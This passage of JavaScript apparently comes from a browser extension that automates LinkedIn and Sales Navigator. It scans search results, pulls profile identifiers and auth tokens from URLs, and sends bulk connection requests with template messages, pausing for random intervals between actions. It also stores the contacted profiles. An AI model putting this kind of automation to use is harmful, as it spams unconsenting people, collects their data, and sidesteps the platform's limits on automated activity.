                                            }).text(local_strings['SCANNING_IN'] + end_time));
                                            if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                cont_div.find(".content-wrapper").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SCANNING_IN'] + end_time));
                                            } else if (cont_div.find(".bd").length > 0) {
                                                cont_div.find(".bd").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SCANNING_IN'] + end_time));
                                            } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                cont_div.find(".result-lockup__actions").append($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SCANNING_IN'] + end_time));
                                            }
                                        }, 1000);
                                        if (nextViewTimer) {
                                            clearTimeout(nextViewTimer);
                                            nextViewTimer = null;
                                        }
                                        nextViewTimer = setTimeout(function() {
                                            cont_div.find(".time_rem_span").remove();
                                            cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                            cont_div.find(".search-result__actions").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['SCANNED']));
                                            if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                cont_div.find(".content-wrapper").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SCANNED']));
                                            } else if (cont_div.find(".bd").length > 0) {
                                                cont_div.find(".bd").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SCANNED']));
                                            } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                cont_div.find(".result-lockup__actions").append($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SCANNED']));
                                            }
                                            chrome.runtime.sendMessage({
                                                setBadge: finished_in_remaining.toString(),
                                                mode: 'scan'
                                            });
                                            if (!local_data.startedScanning || ($("#start_scanning").length > 0 && !$("#start_scanning").hasClass("started"))) {
                                                clearTimeout(nextViewTimer);
                                                nextViewTimer = null;
                                                return false;
                                            }
                                            clearInterval(nextViewInter);
                                            nextViewInter = null;
                                            startScanning(currentIdx);
                                        }, RANDOM_TIMER);
                                    })
                                }
                            })
                        }
                    } else {
                        cont_div.addClass("leo_visit_error");
                        cont_div.find(".time_rem_span").remove();
                        cont_div.find(".search-result__actions").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['UNABLE_TO_SCAN']));
                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['UNABLE_TO_SCAN']));
                        } else if (cont_div.find(".bd").length > 0) {
                            cont_div.find(".bd").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['UNABLE_TO_SCAN']));
                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['UNABLE_TO_SCAN']));
                        }
                        currentIdx++;
                        startScanning(currentIdx);
                        return false;
                    }
                })
            }
        });
    });
}


function startSending() {
    if (search_records_count < 1) {
        setupExtensionVars(function() {
            startSending();
        });
        return false;
    }
    checkForRandom(function(){
        setupExtensionVars(function() {
            updateLocalData(function() {
                var cont_div = $(".results-list > li").eq(currentIdx);
                if (isSalesNav) {
                    cont_div = $("#results-list > li").eq(currentIdx);
                }
                if(cont_div.length == 0){
                    cont_div = $(".search-results__list > li").eq(currentIdx);
                }
                if(cont_div.length == 0 && isSalesNav){
                    cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                }
                // if($(".search-results li.search-result").length > 0){
                //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                // }
                if (connectPremiumOnly) {
                    while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startSending, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false
                    }
                }
                if (skipProfileWithNoPicConn) {
                    while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                        if(leonard_stopped){
                            break;
                        }
                        currentIdx++;
                        cont_div = $(".results-list > li").eq(currentIdx);
                        if ($("#results").length > 0) {
                            cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                        } else if ($("#results-list").length > 0) {
                            cont_div = $("#results-list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0){
                            cont_div = $(".search-results__list > li").eq(currentIdx);
                        }
                        if(cont_div.length == 0 && isSalesNav){
                            cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                        }
                        // if($(".search-results li.search-result").length > 0){
                        //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                        // }
                        if(cont_div.next().hasClass("search-result__occlusion-hint")){
                            var elOffset = cont_div.offset().top;
                            var elHeight = cont_div.height();
                            var windowHeight = $(window).height();
                            var offset;
                            if (elHeight < windowHeight) {
                                offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                            } else {
                                offset = elOffset;
                            }
                            $('html, body').animate({
                                scrollTop: offset
                            }, 100);
                            setTimeout(startSending, 1000);
                            return false;
                        }
                    }
                    if(leonard_stopped){
                        stopLeonard();
                        return false
                    }
                }
                if ((cont_div.length == 0 && finished_conns_in_remaining > 0) || currentIdx > search_records_count - 1) {
                    chrome.storage.local.set({
                        nextPageRedirect: {
                            conns_count: finished_conns_in_remaining
                        }
                    }, function() {
                        if ($(".next").length > 0) {
                            $(".next").trigger('click')
                        } else if ($(".next a").length > 0) {
                            window.location.href = location.origin + $(".next a").attr("href");
                        } else if (isSalesNav && $(".next-pagination").length > 0 && !$(".next-pagination").hasClass("disabled")) {
                            $(".next-pagination")[0].click();
                        } else if (isSalesNav && $(".search-results__pagination-next-button").length > 0) {
                            $(".search-results__pagination-next-button").click();
                        } else {
                            showNotification(local_strings['NO_PROFILES_TO_CONNECT']);
                            downloadCSVIfEnabled();
                            stopLeonard();
                            return false;
                        }
                        startNextPageTimer('send');
                    });
                    return false;
                }
                if (!local_data.selectedInvitationMessage) {
                    chrome.storage.local.set({
                        nextPageRedirect: false
                    });
                    return false;
                }
                if (cont_div.length == 0 || (!isSalesNav && cont_div.find("div > a:first").length == 0) || (isSalesNav && cont_div.find(".result-lockup__name").length > 0 && cont_div.find(".result-lockup__name a").length == 0)) {
                    activateThisTab(function() {
                        setTimeout(function() {
                            $("#start_sending_conn").text("STOP");
                            $("#start_sending_conn").addClass("started");
                            setStopLeonardBtn(true);
                            leonard_stopped = false;
                            startSending();
                        }, 1000);
                    })
                    // showNotification(local_strings['ACTIVATE_LINKEDIN']);
                    stopLeonard(true);
                    return false;
                }
                var elOffset = cont_div.offset().top;
                var elHeight = cont_div.height();
                var windowHeight = $(window).height();
                var offset;
                if (elHeight < windowHeight) {
                    offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                } else {
                    offset = elOffset;
                }
                $('html, body').animate({
                    scrollTop: offset
                }, 100);
                /* code for scrolling into view (ember bug)*/
                if (cont_div.hasClass("search-result__occlusion-hint")) {
                    setTimeout(startSending, 1000);
                    return false;
                }
                if(cont_div.find(".search-result__actions").length == 0 && cont_div.find(".content-wrapper").length == 0 && cont_div.find(".bd").length == 0 && cont_div.find(".result-lockup__actions").length == 0){
                    currentIdx++;
                    startSending(currentIdx);
                    return false;
                }

                var entityUrn, btnText, profile_link;
                if(cont_div.find("div > a:first").length > 0){
                    entityUrn = cont_div.find("div > a:first").attr("href").slice(4, -1);
                    profile_link = cont_div.find("div > a:first").attr("href");
                } else if(cont_div.find(".result-lockup__name a").length > 0){
                    profile_link = cont_div.find(".result-lockup__name a").attr("href");
                }
                if(profile_link){
                    var entityUrnMatch = profile_link.match(/sales\/.*?\/(.*?),/);
                    if(entityUrnMatch && entityUrnMatch.length > 0){
                        entityUrn = profile_link.match(/sales\/.*?\/(.*?),/)[1];
                    }
                }
                var tracking_id = cont_div.find("div > a").attr("data-control-id");
                var member_id;
                var view_url = cont_div.find("div > a:first").attr("href");
                if (isSalesNav) {
                    view_url = cont_div.find("a.name-link").length > 0 && cont_div.find("a.name-link")[0].href;
                    if(!view_url){
                        view_url = cont_div.find(".result-lockup__name a").attr("href");
                    }
                    if(cont_div.find("button.result-lockup__connect").length > 0){
                        btnText = cont_div.find("button.result-lockup__connect").text().trim();
                    } else if(cont_div.find("button.search-result__actions--primary").length > 0){
                        btnText = cont_div.find("button.search-result__actions--primary").text().trim();
                    } else {
                        btnText = cont_div.find("button.action.connect").text().trim();
                    }
                    member_id = cont_div.find("[name=memberId]").val();
                } else {
                    if (idUrnMapObj[tracking_id] && idUrnMapObj[tracking_id].member_id) {
                        member_id = idUrnMapObj[tracking_id].member_id.slice(14);
                    }
                    if(cont_div.find("button.search-result__actions--primary").length > 0){
                        btnText = cont_div.find("button.search-result__actions--primary").text().trim();
                    } else {
                        btnText = cont_div.find("button.action.connect").text().trim();
                    }
                }
                if (view_url.indexOf('www.linkedin.com') == -1) {
                    view_url = 'https://www.linkedin.com' + view_url;
                }
                var conn_found_idx;
                sent_connections.forEach(function(conn, idx) {
                    if (conn.c_entityUrn == entityUrn || (conn.c_member_id == member_id && member_id)) {
                        conn_found_idx = idx;
                    }
                });
                cont_div.find(".time_rem_span").remove();
                if(isProfileSkipped(entityUrn) || isProfileSkipped(member_id)){
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SKIPPED']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SKIPPED']));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startSending(currentIdx);
                } else if (sent_connections[conn_found_idx]) {
                    // views[view_found_idx]['skipped']++;
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['ALREADY_SENT']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['ALREADY_SENT']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['ALREADY_SENT']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['ALREADY_SENT']));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startSending(currentIdx);
                } else if (btnText != 'Connect' && btnText != 'InMail') {
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['CANNOT_CONNECT']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['CANNOT_CONNECT']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['CANNOT_CONNECT']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['CANNOT_CONNECT']));
                    }
                    cont_div.addClass("leo_skipped");
                    currentIdx++;
                    startSending(currentIdx);
                    // stopLeonard();
                    // stopConnectionPropagation();
                } else if(btnText == 'Connect' || btnText == 'InMail'){
                    cont_div.addClass("leo_visiting");
                    cont_div.find(".search-result__actions").prepend($('<span />', {
                        'class': 'time_rem_span'
                    }).text(local_strings['SENDING_CONN_REQ']));
                    if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                        cont_div.find(".content-wrapper").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SENDING_CONN_REQ']));
                    } else if (cont_div.find(".bd").length > 0) {
                        cont_div.find(".bd").prepend($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SENDING_CONN_REQ']));
                    } else if(cont_div.find(".result-lockup__actions").length > 0) {
                        cont_div.find(".result-lockup__actions").append($('<span />', {
                            'class': 'time_rem_span'
                        }).text(local_strings['SENDING_CONN_REQ']));
                    }
                    var invMesObj = invitationMessages.filter(function(t) {
                        return t.id == local_data.selectedInvitationMessage
                    })[0];
                    var folUpObj = followUpMessages.filter(function(t) {
                        return t.id == local_data.selectedFollowUpMessage
                    })[0];
                    if (!invMesObj) {
                        if (local_data.selectedInvitationMessage) {
                            invMesObj = {
                                template_content: local_data.selectedInvitationMessage
                            }
                        } else {
                            showNotification(local_strings['NO_MSG_ERR']);
                            return false;
                        }
                    }
                    if (!folUpObj) {
                        if (local_data.selectedFollowUpMessage) {
                            folUpObj = {
                                template_content: local_data.selectedFollowUpMessage
                            }
                        }
                    }
                    var sendConnectionRequest = function(attrs){
                        var firstName = attrs.firstName;
                        var lastName = attrs.lastName;
                        var publicIdentifier = attrs.publicIdentifier;
                        var profile_id = attrs.objectUrn;
                        var conn_tags = $('#conn_inv_tags option:selected').length > 0 ? $('#conn_inv_tags option:selected').map(function() {
                            return $(this).text();
                        }).toArray().join(',') : '';
                        if (conn_tags == "" && local_data.selectedTags.length > 0) {
                            var conn_tags_arr = [];
                            tags.forEach(function(t) {
                                if(local_data.selectedTags.indexOf(t.id) > -1){
                                    conn_tags_arr.push(t.tag_name);
                                }
                            });
                            conn_tags = conn_tags_arr.join(',');
                        }
                        sendConnection(attrs, function(resp) {
                            if(resp == 'error'){
                                cont_div.find('.time_rem_span').remove();
                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['CANT_SEND_CONN']));
                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['CANT_SEND_CONN']));
                                } else if (cont_div.find(".bd").length > 0) {
                                    cont_div.find(".bd").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['CANT_SEND_CONN']));
                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['CANT_SEND_CONN']));
                                }
                                cont_div.addClass("leo_visit_error");
                                currentIdx++;
                                startSending(currentIdx);
                                return false;
                            }
                            finished_conns_in_remaining++;
                            local_data.currentIdx++;
                            currentIdx++;
                            local_data.REMAINING_CONNECTION_REQUESTS--;
                            if (local_data.rcr <= finished_conns_in_remaining || local_data.REMAINING_CONNECTION_REQUESTS <= 0) {
                                clearInterval(nextViewInter);
                                nextViewInter = null;
                                clearTimeout(nextViewTimer);
                                nextViewTimer = null;
                                chrome.storage.local.set({
                                    nextPageRedirect: false
                                });
                                $("#start_sending_conn").text(local_strings['SEND']);
                                $("#start_sending_conn").removeClass("started");
                                var attachments = false;
                                if(local_data.selectedFollowUpMessage){
                                    var selectedFollowUpMessage = followUpMessages.filter(x=>x.template_content == local_data.selectedFollowUpMessage);
                                    if(selectedFollowUpMessage && selectedFollowUpMessage.length > 0) attachments = selectedFollowUpMessage[0].attachments;
                                }
                                var connObj = {
                                    c_name: firstName + " " + lastName,
                                    c_profile_url: view_url,
                                    c_entityUrn : entityUrn,
                                    c_public_id: publicIdentifier,
                                    c_member_id: profile_id,
                                    invitation_message: local_data.selectedInvitationMessage,
                                    follow_up_message: local_data.selectedFollowUpMessage || '',
                                    conn_tags: conn_tags,
                                    attachments: attachments,
                                    response : resp
                                }
                                saveConnToDB(connObj, function(error) {
                                    updateLocalData(function() {
                                        currentIdx = 0;
                                        chrome.runtime.sendMessage({
                                            removeBadge: true
                                        })
                                        // local_data.startedSending = false;
                                        local_data.rcr = local_data.REMAINING_CONNECTION_REQUESTS;
                                        // showNotification(local_strings['FINISHED_CONN_REQ_1'] + finished_conns_in_remaining + local_strings['FINISHED_CONN_REQ_2']);
                                        notifyUser(local_strings['FINISHED_CONN_REQ_1'] + finished_conns_in_remaining + local_strings['FINISHED_CONN_REQ_2']);
                                        cont_div.find(".time_rem_span").text(local_strings['CONN_REQ_SENT']);
                                        cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                        updateLocalData();
                                        checkForAcceptedConnections();
                                        setStopLeonardBtn(false);
                                        stopLeonard(false);
                                    })
                                },attrs);
                                return false;
                            } else {
                                var attachments = false;
                                if(local_data.selectedFollowUpMessage){
                                    var selectedFollowUpMessage = followUpMessages.filter(x=>x.template_content == local_data.selectedFollowUpMessage);
                                    if(selectedFollowUpMessage && selectedFollowUpMessage.length > 0) attachments = selectedFollowUpMessage[0].attachments;
                                }
                                var connObj = {
                                    c_name: firstName + " " + lastName,
                                    c_profile_url: view_url,
                                    c_entityUrn : entityUrn,
                                    c_public_id: publicIdentifier,
                                    c_member_id: profile_id,
                                    invitation_message: local_data.selectedInvitationMessage,
                                    follow_up_message: local_data.selectedFollowUpMessage || '',
                                    conn_tags: conn_tags,
                                    attachments: attachments,
                                    response : resp
                                }
                                saveConnToDB(connObj, function(error) {
                                    var RANDOM_TIMER = randomInRange(MIN_TIME_TO_NEXT, MAX_TIME_TO_NEXT);
                                    updateLocalData(function() {
                                        var end_timer = Date.now() + RANDOM_TIMER;
                                        if (nextViewInter) {
                                            clearInterval(nextViewInter);
                                            nextViewInter = null;
                                        }
                                        nextViewInter = setInterval(function() {
                                            if (!local_data.startedSending || ($("#start_sending_conn").length > 0 && !$("#start_sending_conn").hasClass("started"))) {
                                                clearTimeout(nextViewInter);
                                                nextViewInter = null;
                                                return false;
                                            }
                                            var end_time = Math.round((end_timer - Date.now()) / 1000);
                                            if (end_time < 1) {
                                                clearInterval(nextViewInter);
                                                nextViewInter = null;
                                            }
                                            if (connectPremiumOnly) {
                                                while (cont_div.find(".premium-icon, .premiumicon, .linkedin-premium-icon, .m-type--premium").length == 0 && currentIdx <= search_records_count) {
                                                    if(leonard_stopped){
                                                        break;
                                                    }
                                                    currentIdx++;
                                                    cont_div = $(".results-list > li").eq(currentIdx);
                                                    if ($("#results").length > 0) {
                                                        cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                    } else if ($("#results-list").length > 0) {
                                                        cont_div = $("#results-list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0){
                                                        cont_div = $(".search-results__list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0 && isSalesNav){
                                                        cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                                                    }
                                                    // if($(".search-results li.search-result").length > 0){
                                                    //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                                                    // }
                                                    if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                        var elOffset = cont_div.offset().top;
                                                        var elHeight = cont_div.height();
                                                        var windowHeight = $(window).height();
                                                        var offset;
                                                        if (elHeight < windowHeight) {
                                                            offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                        } else {
                                                            offset = elOffset;
                                                        }
                                                        $('html, body').animate({
                                                            scrollTop: offset
                                                        }, 100);
                                                        setTimeout(startSending, 1000);
                                                        return false;
                                                    }
                                                }
                                                if(leonard_stopped){
                                                    stopLeonard();
                                                    return false;
                                                }
                                            }
                                            if (skipProfileWithNoPicConn) {
                                                while ((cont_div.find(".search-result__image img, .result-lockup__icon-link img").hasClass('ghost-person') || cont_div.find(".person-ghost").length > 0 || cont_div.find(".search-result__image-wrapper .ghost-person").length > 0) && currentIdx <= search_records_count) {
                                                    if(leonard_stopped){
                                                        break;
                                                    }
                                                    currentIdx++;
                                                    cont_div = $(".results-list > li").eq(currentIdx);
                                                    if ($("#results").length > 0) {
                                                        cont_div = $("#results > li[data-li-entity-id]").eq(currentIdx);
                                                    } else if ($("#results-list").length > 0) {
                                                        cont_div = $("#results-list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0){
                                                        cont_div = $(".search-results__list > li").eq(currentIdx);
                                                    }
                                                    if(cont_div.length == 0 && isSalesNav){
                                                        cont_div = $(".search-results .search-results__result-list li.search-results__result-item").eq(currentIdx);
                                                    }
                                                    // if($(".search-results li.search-result").length > 0){
                                                    //     cont_div = $(".search-results li.search-result").eq(currentIdx);
                                                    // }
                                                    if(cont_div.next().hasClass("search-result__occlusion-hint")){
                                                        var elOffset = cont_div.offset().top;
                                                        var elHeight = cont_div.height();
                                                        var windowHeight = $(window).height();
                                                        var offset;
                                                        if (elHeight < windowHeight) {
                                                            offset = elOffset - ((windowHeight / 2) - (elHeight / 2));
                                                        } else {
                                                            offset = elOffset;
                                                        }
                                                        $('html, body').animate({
                                                            scrollTop: offset
                                                        }, 100);
                                                        setTimeout(startSending, 1000);
                                                        return false;
                                                    }
                                                }
                                                if(leonard_stopped){
                                                    stopLeonard();
                                                    return false
                                                }
                                            }
                                            end_time = end_time + " secs";
                                            cont_div.addClass("leo_visiting");
                                            cont_div.find(".time_rem_span").remove();
                                            cont_div.find(".search-result__actions").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['SENDING_CONN'] + end_time));
                                            if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                cont_div.find(".content-wrapper").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SENDING_CONN'] + end_time));
                                            } else if (cont_div.find(".bd").length > 0) {
                                                cont_div.find(".bd").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SENDING_CONN'] + end_time));
                                            } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                cont_div.find(".result-lockup__actions").append($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['SENDING_CONN'] + end_time));
                                            }
                                        }, 1000);
                                        if (nextViewTimer) {
                                            clearTimeout(nextViewTimer);
                                            nextViewTimer = null;
                                        }
                                        nextViewTimer = setTimeout(function() {
                                            cont_div.find(".time_rem_span").remove();
                                            if(resp == 'error'){
                                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['ALREADY_SENT']));
                                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['ALREADY_SENT']));
                                                } else if (cont_div.find(".bd").length > 0) {
                                                    cont_div.find(".bd").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['ALREADY_SENT']));
                                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['ALREADY_SENT']));
                                                }
                                                cont_div.addClass("leo_skipped");
                                            } else {
                                                cont_div.removeClass("leo_visiting").addClass("leo_visited");
                                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                                    'class': 'time_rem_span'
                                                }).text(local_strings['CONN_REQ_SENT']));
                                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['CONN_REQ_SENT']));
                                                } else if (cont_div.find(".bd").length > 0) {
                                                    cont_div.find(".bd").prepend($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['CONN_REQ_SENT']));
                                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                                        'class': 'time_rem_span'
                                                    }).text(local_strings['CONN_REQ_SENT']));
                                                }
                                            }

                                            chrome.runtime.sendMessage({
                                                setBadge: finished_conns_in_remaining.toString(),
                                                mode: 'send'
                                            });
                                            if (!local_data.startedSending || ($("#start_sending_conn").length > 0 && !$("#start_sending_conn").hasClass("started"))) {
                                                clearTimeout(nextViewTimer);
                                                nextViewTimer = null;
                                                return false;
                                            }
                                            clearInterval(nextViewInter);
                                            nextViewInter = null;
                                            startSending(currentIdx);
                                        }, RANDOM_TIMER);
                                    });
                                },attrs);
                            }
                        })
                    }
                    var moduleKey, pageKey, contextId, requestId, pageNumber, authToken, authType;
                    if(isSalesNav){
                        $.ajax({
                            url: view_url,
                            success: function(response) {
                                // find profile identifier
                                if(response.match(/profileId:(.*?),/)){
                                    var temp_entityUrn = response.match(/profileId:(.*?),/)[1];
                                    if(temp_entityUrn.length == 39){
                                        entityUrn = temp_entityUrn;
                                    }
                                } else if(response.match(/sales\/.*?\/(.*?),/)){
                                    var temp_entityUrn = response.match(/sales\/.*?\/(.*?),/)[1];
                                    if(temp_entityUrn.length == 39){
                                        entityUrn = temp_entityUrn;
                                    }
                                }
                                if(view_url){
                                    var key_arr = view_url.replace(/.*?profile\//, '').split('?');
                                    if(key_arr.length > 0){
                                        var profile_id = key_arr[0].split(',')[0];
                                        authToken = key_arr[0].split(',')[1];
                                        authType = key_arr[0].split(',')[2];
                                        if(key_arr.length > 0){
                                            var key_obj = key_arr[1].split('&');
                                            key_obj.forEach(function(k) {
                                                switch (k.split('=')[0]) {
                                                    case 'moduleKey':
                                                        moduleKey = k.split('=')[1] || 'peopleSearchResults';
                                                        break;
                                                    case 'pageKey':
                                                        pageKey = k.split('=')[1] || 'sales-search3-saved-search-delta';
                                                        break;
                                                    case 'contextId':
                                                        contextId = k.split('=')[1];
                                                        break;
                                                    case 'requestId':
                                                        requestId = k.split('=')[1];
                                                        break;
                                                    case 'pageNumber':
                                                        pageNumber = k.split('=')[1];
                                                        break;
                                                }
                                            });
                                        }
                                    } else {
                                        cont_div.addClass("leo_visit_error");
                                        cont_div.find(".time_rem_span").remove();
                                        cont_div.find(".search-result__actions").prepend($('<span />', {
                                            'class': 'time_rem_span'
                                        }).text(local_strings['ERR_CONN_REQ']));
                                        if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                            cont_div.find(".content-wrapper").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['ERR_CONN_REQ']));
                                        } else if (cont_div.find(".bd").length > 0) {
                                            cont_div.find(".bd").prepend($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['ERR_CONN_REQ']));
                                        } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                            cont_div.find(".result-lockup__actions").append($('<span />', {
                                                'class': 'time_rem_span'
                                            }).text(local_strings['ERR_CONN_REQ']));
                                        }
                                        chrome.runtime.sendMessage({
                                            audit: true,
                                            event: 'invitation_sending_failed'
                                        });
                                        currentIdx++;
                                        startSending(currentIdx);
                                        return false;
                                    }
                                }
                            },
                            error: function() {
                                cont_div.addClass("leo_visit_error");
                                cont_div.find(".time_rem_span").remove();
                                cont_div.find(".search-result__actions").prepend($('<span />', {
                                    'class': 'time_rem_span'
                                }).text(local_strings['ERR_CONN_REQ']));
                                if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
                                    cont_div.find(".content-wrapper").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_CONN_REQ']));
                                } else if (cont_div.find(".bd").length > 0) {
                                    cont_div.find(".bd").prepend($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_CONN_REQ']));
                                } else if(cont_div.find(".result-lockup__actions").length > 0) {
                                    cont_div.find(".result-lockup__actions").append($('<span />', {
                                        'class': 'time_rem_span'
                                    }).text(local_strings['ERR_CONN_REQ']));
                                }
                                currentIdx++;
                                startSending(currentIdx);
                            },
                            async : false
                        });
                    }
                    visitProfile(entityUrn, function(attrs){
                        if(attrs){
                            attrs.moduleKey = moduleKey;
                            attrs.pageKey = pageKey;
                            attrs.contextId = contextId;
                            attrs.requestId = requestId;
                            attrs.pageNumber = pageNumber;
                            attrs.authToken = authToken;
                            attrs.authType = authType;
                            sendConnectionRequest(attrs);
                        } else {
                            cont_div.addClass("leo_visit_error");
                            cont_div.find(".time_rem_span").remove();
                            cont_div.find(".search-result__actions").prepend($('<span />', {
                                'class': 'time_rem_span'
                            }).text(local_strings['ERR_CONN_REQ']));
                            if (isSalesNav && cont_div.find(".content-wrapper").length > 0) {
